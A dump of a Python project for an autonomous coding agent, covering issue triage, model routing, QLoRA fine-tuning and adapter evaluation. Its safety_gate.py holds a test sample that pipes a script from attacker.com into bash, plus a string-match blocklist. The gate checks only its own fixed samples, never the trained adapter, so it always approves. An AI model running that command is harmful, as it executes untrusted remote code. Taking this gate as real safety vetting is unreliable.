            bench_results = self.safety_gate.run_benchmark_suite()
            if not bench_results["passed"]:
                print(f"[Distillation Daemon] Safety gate rejected '{role}'.")
                summary["processed_roles"][role] = {
                    "status": "REJECTED_BY_SAFETY_GATE",
                    "benchmark": bench_results,
                }
                continue

            # 3. Dispatch or Stage QLoRA
            job_result = self.qlora.dispatch_training_job(role, dataset_path)

            # 4. Register in Central Manifest
            reg_entry = adapter_registry.register_adapter(
                role=role,
                adapter_path=job_result.get("adapter_dir", str(dataset_path.parent)),
                base_model=self.qlora.DEFAULT_BASE_MODEL,
                benchmark_score=bench_results["pass_rate"],
                training_samples=info["samples"],
                metadata={"job_status": job_result["status"], "tier": tier_name},
            )

            summary["processed_roles"][role] = {
                "job": job_result,
                "registered": reg_entry,
            }

            if job_result["status"] == "COMPLETED":
                summary["trained_roles"].append(job_result)
            else:
                summary["staged_exports"].append(job_result)

            print(f"[Distillation Daemon] Role '{role}' complete -> Status: {job_result['status']}")

        print("\n=== [Distillation Daemon] Cycle Complete ===")
        return summary

    def execute_distillation_cycle(self) -> Dict[str, Any]:
        return self.run_training_cycle()


distillation_daemon = DistillationDaemon()

--- END FILE: agent/training/distillation_daemon.py ---

--- START FILE: agent/training/evaluator.py ---
import ast
from typing import Any, Dict, List
from agent.training.adapter_registry import adapter_registry
from llm.router import ModelRouter

BENCHMARK_TASKS = [
    {
        "id": "py_health_check",
        "role": "mason_backend_mason",
        "task": "Write a Python function `get_system_health() -> dict` returning status, cpu_usage float, and is_healthy bool.",
        "eval_fn": lambda code: "def get_system_health" in code and "is_healthy" in code
    },
    {
        "id": "py_safe_divide",
        "role": "mason_backend_mason",
        "task": "Write a Python function `safe_divide(a: float, b: float) -> float | None` that handles ZeroDivisionError gracefully.",
        "eval_fn": lambda code: "def safe_divide" in code and "ZeroDivisionError" in code
    },
    {
        "id": "test_suite_mock",
        "role": "tester",
        "task": "Write a pytest test function `test_database_retry()` using unittest.mock to simulate connection retry.",
        "eval_fn": lambda code: "test_database_retry" in code and "mock" in code.lower()
    }
]

class AdapterBenchmark:
    """Evaluates candidate adapter weights against baseline models before deployment."""

    def __init__(self, router: ModelRouter):
        self.router = router

    def evaluate_role(self, role: str, min_promotion_score: float = 0.5) -> Dict[str, Any]:
        role_tasks = [t for t in BENCHMARK_TASKS if t["role"] == role]
        if not role_tasks:
            role_tasks = [t for t in BENCHMARK_TASKS if "mason" in t["role"]]

        total = len(role_tasks)
        passed = 0
        syntax_valid = 0

        print(f"[Benchmark] Starting evaluation for role '{role}' ({total} tasks)...")

        for idx, task in enumerate(role_tasks, 1):
            messages = [
                {"role": "system", "content": "You are a code specialist. Return only runnable code in markdown fences."},
                {"role": "user", "content": task["task"]},
            ]
            try:
                res, model_used = self.router.complete_with_fallback("coding", messages)
                from agent.masons.base_mason import extract_code_block
                code = extract_code_block(res)

                try:
                    ast.parse(code)
                    syntax_valid += 1
                except SyntaxError:
                    print(f"  • Task #{idx} [{task['id']}] failed AST parsing.")
                    continue

                if task["eval_fn"](code):
                    passed += 1
                    print(f"  • Task #{idx} [{task['id']}] PASSED via {model_used}")
                else:
                    print(f"  • Task #{idx} [{task['id']}] failed assertions.")
            except Exception as e:
                print(f"  • Task #{idx} failed with error: {e}")

        score = (passed / total) if total > 0 else 0.0
        promoted = score >= min_promotion_score

        active_adapter = adapter_registry.get_active_adapter(role)
        if promoted and active_adapter:
            active_adapter["benchmark_score"] = score
            active_adapter["active"] = True
            adapter_registry._save()
            print(f"[Benchmark] Adapter for '{role}' PROMOTED (Score: {score:.2f} >= {min_promotion_score}).")
        else:
            print(f"[Benchmark] Adapter score: {score:.2f} (Promoted: {promoted}).")

        return {
            "role": role,
            "total_tasks": total,
            "passed": passed,
            "syntax_valid": syntax_valid,
            "score": score,
            "promoted": promoted,
        }

--- END FILE: agent/training/evaluator.py ---

--- START FILE: agent/training/experience_buffer.py ---
import json
import os
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional


@dataclass
class TrajectoryRecord:
    timestamp: float
    agent_role: str
    task_type: str
    input_context: str
    action_output: str
    outcome_reward: float  # 1.0 (passed/approved), 0.0 (fallback), -1.0 (syntax/compilation error)
    metadata: Dict[str, Any]


class ExperienceBuffer:
    """
    Append-only local trajectory storage for agent actions.
    Persists successful reasoning loops to enable offline QLoRA distillation.
    """

    def __init__(self, storage_dir: str = ".experience"):
        self.storage_dir = Path(storage_dir)
        self.storage_dir.mkdir(parents=True, exist_ok=True)

    def _get_buffer_path(self, agent_role: str) -> Path:
        clean_role = agent_role.lower().replace(" ", "_")
        return self.storage_dir / f"{clean_role}_trajectories.jsonl"

    def record_trajectory(
        self,
        agent_role: str,
        task_type: str,
        input_context: str,
        action_output: str,
        outcome_reward: float,
        metadata: Optional[Dict[str, Any]] = None,
    ) -> TrajectoryRecord:
        """
        Appends an execution trajectory into the agent's dedicated JSONL buffer.
        """
        record = TrajectoryRecord(
            timestamp=time.time(),
            agent_role=agent_role,
            task_type=task_type,
            input_context=input_context,
            action_output=action_output,
            outcome_reward=outcome_reward,
            metadata=metadata or {},
        )

        buffer_file = self._get_buffer_path(agent_role)
        with open(buffer_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(asdict(record)) + "\n")

        return record

    def export_sft_dataset(self, agent_role: str, min_reward: float = 0.5) -> List[Dict[str, Any]]:
        """
        Exports successful trajectories into instruction-tuning conversation format.
        """
        buffer_file = self._get_buffer_path(agent_role)
        if not buffer_file.exists():
            return []

        dataset = []
        with open(buffer_file, "r", encoding="utf-8") as f:
            for line in f:
                if not line.strip():
                    continue
                item = json.loads(line)
                if item.get("outcome_reward", 0.0) >= min_reward:
                    dataset.append({
                        "messages": [
                            {"role": "user", "content": item["input_context"]},
                            {"role": "assistant", "content": item["action_output"]},
                        ],
                        "reward": item["outcome_reward"],
                        "task_type": item["task_type"],
                    })
        return dataset

    def get_stats(self) -> Dict[str, Any]:
        """Returns trajectory counts and average rewards by agent role."""
        stats = {}
        for file in self.storage_dir.glob("*_trajectories.jsonl"):
            role = file.stem.replace("_trajectories", "")
            count = 0
            rewards = []
            with open(file, "r", encoding="utf-8") as f:
                for line in f:
                    if line.strip():
                        count += 1
                        try:
                            rewards.append(json.loads(line).get("outcome_reward", 0.0))
                        except Exception:
                            pass
            avg_r = (sum(rewards) / len(rewards)) if rewards else 0.0
            stats[role] = {"samples": count, "average_reward": round(avg_r, 3)}
        return stats


# Global default buffer singleton
experience_buffer = ExperienceBuffer()

--- END FILE: agent/training/experience_buffer.py ---

--- START FILE: agent/training/qlora_pipeline.py ---
import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, Optional
from tools.system_tier import CURRENT_TIER, HardwareTier


def get_tier_label() -> str:
    return getattr(CURRENT_TIER, "name", str(CURRENT_TIER))


def is_high_tier() -> bool:
    high_marker = getattr(HardwareTier, "TIER_HIGH", "high")
    return CURRENT_TIER == high_marker or str(CURRENT_TIER).lower() in ("high", "tier_high")


class QLoRAPipeline:
    """
    Prepares and dispatches QLoRA fine-tuning jobs.
    Configures 4-bit NF4 quantization, gradient checkpointing, and target projection layers.
    """

    DEFAULT_BASE_MODEL = "meta-llama/Llama-3.2-3B-Instruct"

    def __init__(self, output_root: str = ".adapters"):
        self.output_root = Path(output_root)
        self.output_root.mkdir(parents=True, exist_ok=True)

    def generate_training_script(
        self,
        role: str,
        dataset_path: Path,
        base_model: Optional[str] = None,
        epochs: int = 3,
        batch_size: int = 1,
        lora_r: int = 16,
        lora_alpha: int = 32,
    ) -> Path:
        role_dir = self.output_root / role
        role_dir.mkdir(parents=True, exist_ok=True)
        script_path = role_dir / "run_qlora.py"
        model_name = base_model or self.DEFAULT_BASE_MODEL

        script_content = f'''# Auto-generated QLoRA training harness for role: {role}
import os
import torch
from datasets import load_dataset
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    BitsAndBytesConfig,
    TrainingArguments,
)
from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training
from trl import SFTTrainer

MODEL_ID = "{model_name}"
DATASET_PATH = "{dataset_path.resolve()}"
OUTPUT_DIR = "{role_dir.resolve()}"

print(f"[QLoRA Engine] Starting training for role '{role}' on base model: {{MODEL_ID}}")

bnb_config = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_quant_type="nf4",
    bnb_4bit_compute_dtype=torch.float16,
    bnb_4bit_use_double_quant=True,
)

tokenizer = AutoTokenizer.from_pretrained(MODEL_ID, trust_remote_code=True)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token

device_map = "auto" if torch.cuda.is_available() else "cpu"
model = AutoModelForCausalLM.from_pretrained(
    MODEL_ID,
    quantization_config=bnb_config if torch.cuda.is_available() else None,
    device_map=device_map,
    trust_remote_code=True,
)

if torch.cuda.is_available():
    model = prepare_model_for_kbit_training(model)

lora_config = LoraConfig(
    r={lora_r},
    lora_alpha={lora_alpha},
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM",
)
model = get_peft_model(model, lora_config)
model.print_trainable_parameters()

training_args = TrainingArguments(
    output_dir=OUTPUT_DIR,
    per_device_train_batch_size={batch_size},
    gradient_accumulation_steps=4,
    learning_rate=2e-4,
    lr_scheduler_type="cosine",
    warmup_ratio=0.03,
    num_train_epochs={epochs},
    logging_steps=5,
    save_strategy="epoch",
    fp16=torch.cuda.is_available(),
    report_to="none",
)

dataset = load_dataset("json", data_files=DATASET_PATH, split="train")

def format_prompts(batch):
    formatted = []
    for conv in batch["messages"]:
        text = tokenizer.apply_chat_template(conv, tokenize=False)
        formatted.append(text)
    return {{"text": formatted}}

dataset = dataset.map(format_prompts, batched=True)

trainer = SFTTrainer(
    model=model,
    train_dataset=dataset,
    dataset_text_field="text",
    max_seq_length=2048,
    tokenizer=tokenizer,
    args=training_args,
)

print("[QLoRA Engine] Executing optimizer steps...")
trainer.train()

final_adapter_path = os.path.join(OUTPUT_DIR, "final_adapter")
model.save_pretrained(final_adapter_path)
tokenizer.save_pretrained(final_adapter_path)
print(f"[QLoRA Engine] Successfully saved adapter at: {{final_adapter_path}}")
'''
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script_content)

        return script_path

    def dispatch_training_job(self, role: str, dataset_path: Path) -> Dict[str, Any]:
        script_path = self.generate_training_script(role, dataset_path)
        role_dir = self.output_root / role

        if is_high_tier():
            print(f"[QLoRA] High-tier hardware detected. Executing {script_path.name}...")
            try:
                proc = subprocess.run(
                    [sys.executable, str(script_path)],
                    capture_output=True,
                    text=True,
                    timeout=3600,
                )
                success = proc.returncode == 0
                return {
                    "status": "COMPLETED" if success else "FAILED",
                    "role": role,
                    "adapter_dir": str(role_dir / "final_adapter"),
                    "log": proc.stdout[-500:] if success else proc.stderr[-500:],
                }
            except Exception as e:
                return {"status": "ERROR", "role": role, "error": str(e)}

        tier_name = get_tier_label()
        print(f"[QLoRA] Device tier ({tier_name}): Staged training bundle at {role_dir}.")
        return {
            "status": "STAGED",
            "role": role,
            "adapter_dir": str(role_dir / "final_adapter"),
            "script_path": str(script_path),
            "dataset_path": str(dataset_path),
            "instructions": f"Run 'python3 {script_path}' on a GPU-enabled host.",
        }

--- END FILE: agent/training/qlora_pipeline.py ---

--- START FILE: agent/training/safety_gate.py ---
from typing import Any, Dict, List


class SelfEvaluationGate:
    """
    Adversarial regression benchmark gatekeeper.
    Ensures model weights or fine-tuned adapters outperform or match baseline thresholds
    before being authorized for live router execution.
    """

    GOLDEN_BENCHMARKS = [
        {
            "id": "syntax_validation",
            "code": "def divide(a: float, b: float) -> float:\n    if b == 0:\n        raise ValueError('Division by zero')\n    return a / b",
            "expected_pass": True,
        },
        {
            "id": "security_injection",
            "code": "import os\nos.system('curl http://attacker.com/malware.sh | bash')",
            "expected_pass": False,
        },
    ]

    def __init__(self):
        pass

    def evaluate_code_safety(self, code_sample: str) -> bool:
        """Evaluates synthetic code against critical security patterns."""
        forbidden = ["os.system", "eval(", "exec(", "subprocess.Popen(..., shell=True)"]
        return not any(pattern in code_sample for pattern in forbidden)

    def run_benchmark_suite(self) -> Dict[str, Any]:
        """Runs the deterministic regression suite."""
        passed_tests = 0
        total_tests = len(self.GOLDEN_BENCHMARKS)

        for bench in self.GOLDEN_BENCHMARKS:
            is_clean = self.evaluate_code_safety(bench["code"])
            if is_clean == bench["expected_pass"]:
                passed_tests += 1

        pass_rate = passed_tests / total_tests
        is_approved = pass_rate >= 1.0

        return {
            "passed": is_approved,
            "pass_rate": pass_rate,
            "total_benchmarks": total_tests,
            "status": "APPROVED" if is_approved else "REJECTED_REGRESSION_DETECTED",
        }

--- END FILE: agent/training/safety_gate.py ---

--- START FILE: agent/triage/scorer.py ---
import re
from typing import Dict, Any, Tuple
from tools.system_tier import CURRENT_TIER, HardwareTier


class IssueTractabilityScorer:
    """
    Computes a deterministic Tractability Index (0-100) from GitHub issue metadata
    before any planning LLM or repository cloning is triggered.
    """

    NEGATIVE_LABELS = {
        "needs-discussion", "rfc", "proposal", "design", "question",
        "wontfix", "blocked", "upstream", "epic", "enhancement", "feature"
    }

    POSITIVE_LABELS = {
        "good first issue", "good-first-issue", "beginner-friendly",
        "bug", "patch", "help wanted", "confirmed", "regression"
    }

    STACK_PATTERNS = [
        r"Traceback \(most recent call last\):",
        r"File \".*?\", line \d+",
        r"Error:.*?\n\s+at ",
        r"panic:.*?\ngoroutine \d+",
        r"Exception in thread \".*?\"",
    ]

    NEGATIVE_PHRASES = [
        r"breaking change",
        r"architectural redesign",
        r"what do you think",
        r"how should we handle",
        r"needs consensus",
    ]

    def score(self, issue: Dict[str, Any]) -> Tuple[int, str]:
        body = issue.get("body", "") or ""
        comments = issue.get("comments", 0)
        labels = [
            l.get("name", "").lower() if isinstance(l, dict) else str(l).lower()
            for l in issue.get("labels", [])
        ]

        score = 50
        factors = []

        # 1. Label Analysis
        for label in labels:
            if label in self.NEGATIVE_LABELS:
                score -= 30
                factors.append(f"-30 label:{label}")
            if label in self.POSITIVE_LABELS:
                score += 20
                factors.append(f"+20 label:{label}")

        # 2. Contention via Comments
        if comments == 0:
            score += 5
            factors.append("+5 untouched")
        elif comments > 10:
            score -= 30
            factors.append(f"-30 high_contention({comments} comments)")
        elif comments > 5:
            score -= 15
            factors.append(f"-15 moderate_contention({comments} comments)")

        # 3. Code Evidence & Stack Traces
        has_stack = any(re.search(p, body) for p in self.STACK_PATTERNS)
        if has_stack:
            score += 25
            factors.append("+25 stack_trace_present")

        if "```" in body and not has_stack:
            score += 10
            factors.append("+10 code_block_repro")

        # 4. Explicit File or Line Number References
        file_ref = re.search(r"[\w\/\.-]+\.(py|js|ts|go|rs|cpp|c|java):(\d+)?", body)
        if file_ref:
            score += 15
            factors.append(f"+15 targeted_file({file_ref.group(0)})")

        # 5. Contentious Phrasing
        for phrase in self.NEGATIVE_PHRASES:
            if re.search(phrase, body, re.IGNORECASE):
                score -= 20
                factors.append(f"-20 debate_phrase('{phrase}')")
                break

        # 6. Tier-Adaptive Checks
        if CURRENT_TIER == HardwareTier.TIER_LOW:
            if len(body) > 12000:
                score -= 20
                factors.append("-20 excessive_body_size_for_edge")
        else:
            if "steps to reproduce" in body.lower():
                score += 10
                factors.append("+10 repro_steps_defined")

        final_score = max(0, min(100, score))
        summary = ", ".join(factors) if factors else "baseline"
        return final_score, summary

--- END FILE: agent/triage/scorer.py ---

--- START FILE: agent/triage/selector.py ---
from llm.router import ModelRouter, AllModelsFailedError
from models.schemas import IssueInfo


class IssueAgent:
    """
    Evaluates Candidate issues and selects the optimal task for autonomous resolution.
    """

    def __init__(self, router: ModelRouter):
        self.router = router

    def rank_and_select(self, issues: list) -> IssueInfo:
        if not issues:
            raise ValueError("No issues to select from.")
        summaries = "\n".join(f"[{i}] #{it['number']}: {it['title']}" for i, it in enumerate(issues))
        prompt = (f"Pick the single most tractable issue for an automated fix.\n{summaries}\n"
                  f"Reply with only the index number.")
        try:
            res, model_used = self.router.complete_with_fallback(
                "analysis",
                [{"role": "user", "content": prompt}],
            )
            print(f"[IssueAgent] ranked by {model_used}")
        except AllModelsFailedError:
            res = "0"

        try:
            idx = int("".join(c for c in res if c.isdigit()) or "0")
            idx = idx if 0 <= idx < len(issues) else 0
        except Exception:
            idx = 0

        chosen = issues[idx]
        return IssueInfo(
            number=chosen["number"],
            title=chosen["title"],
            body=chosen.get("body", "") or "",
            html_url=chosen["html_url"],
            repository_full_name=chosen["repository_url"].split("/repos/")[-1],
            labels=[l["name"] for l in chosen.get("labels", [])],
        )

--- END FILE: agent/triage/selector.py ---

--- START FILE: config/settings.py ---
import os
import sys
from pathlib import Path
from dotenv import load_dotenv

load_dotenv()


class Settings:
    OPENROUTER_API_KEY: str = os.getenv("OPENROUTER_API_KEY", "")
    GITHUB_TOKEN: str = os.getenv("GITHUB_TOKEN", "")
    ANTHROPIC_API_KEY: str = os.getenv("ANTHROPIC_API_KEY", "")
    OPENAI_API_KEY: str = os.getenv("OPENAI_API_KEY", "")
    GOOGLE_API_KEY: str = os.getenv("GOOGLE_API_KEY", "")
    OPENROUTER_CODING_MODEL: str = os.getenv("OPENROUTER_CODING_MODEL", "anthropic/claude-3.5-sonnet")
    OPENROUTER_REVIEW_MODEL: str = os.getenv("OPENROUTER_REVIEW_MODEL", "anthropic/claude-3.5-sonnet")
    OPENROUTER_ANALYSIS_MODEL: str = os.getenv("OPENROUTER_ANALYSIS_MODEL", "openai/gpt-4o-mini")
     
    AUTO_APPROVE_COMMANDS: bool = os.getenv("AUTO_APPROVE_COMMANDS", "false").lower() == "true"
    ENABLE_SPRITE_UI: bool = os.getenv("ENABLE_SPRITE_UI", "false").lower() == "true"
    MAX_DEBUG_RETRIES: int = int(os.getenv("MAX_DEBUG_RETRIES", "3"))

    # How many top search results to consider before picking one (adds diversity)
    REPO_SELECTION_POOL_SIZE: int = int(os.getenv("REPO_SELECTION_POOL_SIZE", "5"))
    # New: comma-separated fallback chains per task. Falls back to the
    # single-model env vars above if a chain isn't explicitly set, so
    # existing .env files keep working without changes.
    MODELS_PLANNING: str = os.getenv("MODELS_PLANNING", "")
    MODELS_CODING: str = os.getenv("MODELS_CODING", "")
    MODELS_REVIEW: str = os.getenv("MODELS_REVIEW", "")
    MODELS_DEBUG: str = os.getenv("MODELS_DEBUG", "")
    MODELS_ANALYSIS: str = os.getenv("MODELS_ANALYSIS", "")
    ENABLE_DYNAMIC_MODEL_FALLBACK: bool = os.getenv("ENABLE_DYNAMIC_MODEL_FALLBACK", "false").lower() == "true"
    MAX_DYNAMIC_MODEL_PRICE_PER_MILLION: float = float(os.getenv("MAX_DYNAMIC_MODEL_PRICE_PER_MILLION", "2.0"))
    DYNAMIC_MODEL_CACHE_TTL_SECONDS: int = int(os.getenv("DYNAMIC_MODEL_CACHE_TTL_SECONDS", "600"))

    def get_task_chains(self) -> dict:
        def chain_or_fallback(env_value: str, fallback_model: str) -> list:
            if env_value.strip():
                return [m.strip() for m in env_value.split(",") if m.strip()]
            return [fallback_model]

        return {
            "planning": chain_or_fallback(self.MODELS_PLANNING, self.OPENROUTER_CODING_MODEL),
            "coding": chain_or_fallback(self.MODELS_CODING, self.OPENROUTER_CODING_MODEL),
            "review": chain_or_fallback(self.MODELS_REVIEW, self.OPENROUTER_REVIEW_MODEL),
            "debug": chain_or_fallback(self.MODELS_DEBUG, self.OPENROUTER_CODING_MODEL),
            "analysis": chain_or_fallback(self.MODELS_ANALYSIS, self.OPENROUTER_ANALYSIS_MODEL),
            "orchestration": chain_or_fallback(self.MODELS_ANALYSIS, self.OPENROUTER_ANALYSIS_MODEL),
        }
    def validate_task_chains(self) -> None:
        """Enforces genuine independent review: the model that writes the
        code must not be the same one that reviews it. Checks the first
        (primary) model in each chain — if they match, the review adds
        no real independence."""
        chains = self.get_task_chains()
        coder_primary = chains["coding"][0] if chains.get("coding") else None
        reviewer_primary = chains["review"][0] if chains.get("review") else None

        if coder_primary and reviewer_primary and coder_primary == reviewer_primary:
            print("=" * 60)
            print("CONFIGURATION WARNING")
            print("=" * 60)
            print(f"MODELS_CODING and MODELS_REVIEW both start with '{coder_primary}'.")
            print("The reviewer should differ from the coder for a genuinely")
            print("independent review. Consider setting a different primary")
            print("model in MODELS_REVIEW in your .env.")
            print("=" * 60)
    BASE_DIR: Path = Path(__file__).parent.parent.resolve()
    WORKSPACE_DIR: Path = BASE_DIR / os.getenv("WORKSPACE_DIR", "workspace")
    LOGS_DIR: Path = BASE_DIR / os.getenv("LOGS_DIR", "logs")

settings = Settings()
settings.WORKSPACE_DIR.mkdir(parents=True, exist_ok=True)
settings.LOGS_DIR.mkdir(parents=True, exist_ok=True)

def validate_settings() -> None:
    """Fail fast with a clear message instead of crashing mid-pipeline later."""
    missing = []
    if not settings.OPENROUTER_API_KEY:
        missing.append("OPENROUTER_API_KEY")
    if not settings.GITHUB_TOKEN:
        missing.append("GITHUB_TOKEN")

    if missing:
        print("=" * 60)
        print("CONFIGURATION ERROR — missing required .env values:")
        for key in missing:
            print(f"  - {key}")
        print("Add them to your .env file and try again.")
        print("=" * 60)
        sys.exit(1)

--- START FILE: dump_project.py ---
import os
from pathlib import Path

IGNORE_DIRS = {".git", "__pycache__", ".pytest_cache", ".venv", "venv", "test_pa_env", "workspace"}
ALLOWED_EXTS = {".py", ".json", ".md", ".sh", ".toml", ".yaml", ".yml"}

output_file = Path("project_dump.txt")
root_dir = Path(".")

with open(output_file, "w", encoding="utf-8") as out:
    out.write("=== PROJECT FILE TREE ===\n")
    for path in sorted(root_dir.rglob("*")):
        if any(ignored in path.parts for ignored in IGNORE_DIRS):
            continue
        if path.is_file() and path.suffix in ALLOWED_EXTS and path.name != "project_dump.txt":
            out.write(f"{path}\n")
    
    out.write("\n" + "=" * 60 + "\n")
    out.write("=== FILE CONTENTS ===\n")
    out.write("=" * 60 + "\n\n")
    
    for path in sorted(root_dir.rglob("*")):
        if any(ignored in path.parts for ignored in IGNORE_DIRS):
            continue
        if path.is_file() and path.suffix in ALLOWED_EXTS and path.name != "project_dump.txt":
            out.write(f"--- START FILE: {path} ---\n")
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    out.write(f.read())
            except Exception as e:
                out.write(f"Error reading file: {e}\n")
            out.write(f"\n--- END FILE: {path} ---\n\n")

print(f"[✓] Complete project dump generated: {output_file.resolve()}")
print(f"[✓] File size: {output_file.stat().st_size / 1024:.2f} KB")

--- START FILE: github/client.py ---
import requests
from typing import Dict, Any, Optional
from config.settings import settings


class GitHubClient:
    def __init__(self):
        self.base_url = "https://api.github.com"
        self.headers = {"Accept": "application/vnd.github.v3+json"}
        if settings.GITHUB_TOKEN:
            self.headers["Authorization"] = f"token {settings.GITHUB_TOKEN}"
        self.last_rate_limit: Dict[str, str] = {}

    def request(self, method: str, endpoint: str, params: Optional[Dict] = None,
                data: Optional[Dict] = None) -> Any:
        url = f"{self.base_url}{endpoint}" if not endpoint.startswith("http") else endpoint
        response = requests.request(method, url, headers=self.headers, params=params, json=data, timeout=30)

        remaining = response.headers.get("X-RateLimit-Remaining")
        limit = response.headers.get("X-RateLimit-Limit")
        reset = response.headers.get("X-RateLimit-Reset")
        if remaining is not None:
            self.last_rate_limit = {"remaining": remaining, "limit": limit, "reset": reset}
            print(f"[GitHub] rate limit: {remaining}/{limit} remaining")
            if int(remaining) < 5:
                print(f"[GitHub] WARNING — rate limit nearly exhausted ({remaining} left)")

        if response.status_code >= 400:
            raise RuntimeError(f"GitHub API error {response.status_code}: {response.text[:300]}")
        return response.json()

    def get_rate_limit_status(self) -> Dict[str, Any]:
        """Explicit check — doesn't consume a search-API-specific quota."""
        return self.request("GET", "/rate_limit")

--- END FILE: github/client.py ---

--- START FILE: github/issues.py ---
from typing import List, Dict, Any
from github.client import GitHubClient


class IssueManager:
    def __init__(self, client: GitHubClient):
        self.client = client

    def search_issues(self, repo_full_name: str, state: str = "open", limit: int = 5) -> List[Dict[str, Any]]:
        endpoint = f"/repos/{repo_full_name}/issues"

        params = {"state": state, "per_page": limit, "labels": "good first issue"}
        try:
            items = self.client.request("GET", endpoint, params=params)
        except Exception:
            items = []

        items = [item for item in items if "pull_request" not in item]

        # Fall back to all open issues if the "good first issue" label
        # search returned nothing (not just on error, but on empty result).
        if not items:
            params.pop("labels", None)
            try:
                items = self.client.request("GET", endpoint, params=params)
            except Exception:
                items = []
            items = [item for item in items if "pull_request" not in item]

        return items

--- END FILE: github/issues.py ---

--- START FILE: llm/openrouter.py ---
import json
import time
import requests
from typing import Dict, Generator, List, Optional, Tuple
from config.settings import settings


class OpenRouterClient:
    def __init__(self):
        self.url = "https://openrouter.ai/api/v1/chat/completions"
        self.credits_url = "https://openrouter.ai/api/v1/credits"
        self.key_url = "https://openrouter.ai/api/v1/key"

    def get_headers(self) -> Dict[str, str]:
        key = getattr(settings, "OPENROUTER_API_KEY", "")
        if not key:
            raise ValueError("OPENROUTER_API_KEY is missing from environment.")
        return {
            "Authorization": f"Bearer {key}",
            "HTTP-Referer": "https://github.com/oss-agent",
            "X-Title": "OSS-Agent",
            "Content-Type": "application/json",
        }

    def fetch_balance(self) -> float:
        """Fetches remaining usable credits in USD."""
        try:
            res = requests.get(self.credits_url, headers=self.get_headers(), timeout=8)
            if res.status_code == 200:
                data = res.json().get("data", {})
                total_credits = float(data.get("total_credits", 0.0))
                total_usage = float(data.get("total_usage", 0.0))
                return max(0.0, total_credits - total_usage)
        except Exception:
            pass

        try:
            res = requests.get(self.key_url, headers=self.get_headers(), timeout=8)
            if res.status_code == 200:
                data = res.json().get("data", {})
                limit = data.get("limit")
                usage = float(data.get("usage", 0.0))
                if limit is None or data.get("is_free_tier", False) is False:
                    return max(0.0, float(data.get("limit_remaining", 0.0)))
                return max(0.0, float(limit) - usage)
        except Exception:
            pass

        return 0.0

    def complete(self, model: str, messages: List[Dict[str, str]], temperature: float = 0.2) -> Tuple[str, Dict]:
        """Returns (response_text, usage_dict). usage_dict has prompt_tokens/completion_tokens."""
        payload = {"model": model, "messages": messages, "temperature": temperature}

        retries = 4
        backoff = 2.0
        last_error = None

        for attempt in range(retries):
            try:
                res = requests.post(self.url, headers=self.get_headers(), json=payload, timeout=90)
                if res.status_code == 429:
                    time.sleep(backoff)
                    backoff *= 2
                    continue
                res.raise_for_status()
                data = res.json()
                usage = data.get("usage", {}) or {}
                if usage:
                    print(
                        f"[LLM] model={model} tokens_in={usage.get('prompt_tokens', 0)} "
                        f"tokens_out={usage.get('completion_tokens', 0)}"
                    )
                return data["choices"][0]["message"]["content"], usage
            except Exception as e:
                last_error = e
                if attempt == retries - 1:
                    raise RuntimeError(f"OpenRouter call failed after {retries} attempts: {e}") from e
                time.sleep(backoff)
                backoff *= 2

        raise RuntimeError(f"OpenRouter call failed: {last_error}")

    def complete_stream(
        self, model: str, messages: List[Dict[str, str]], temperature: float = 0.2
    ) -> Generator[str, None, None]:
        """Streams chunk tokens in real-time for live typewriter UI updates."""
        payload = {
            "model": model,
            "messages": messages,
            "temperature": temperature,
            "stream": True,
        }
        res = requests.post(self.url, headers=self.get_headers(), json=payload, timeout=60, stream=True)
        res.raise_for_status()

        for line in res.iter_lines():
            if not line:
                continue
            decoded = line.decode("utf-8").strip()
            if decoded.startswith("data: "):
                data_str = decoded[6:]
                if data_str == "[DONE]":
                    break
                try:
                    chunk = json.loads(data_str)
                    delta = chunk["choices"][0].get("delta", {})
                    token = delta.get("content", "")
                    if token:
                        yield token
                except Exception:
                    continue

--- END FILE: llm/openrouter.py ---
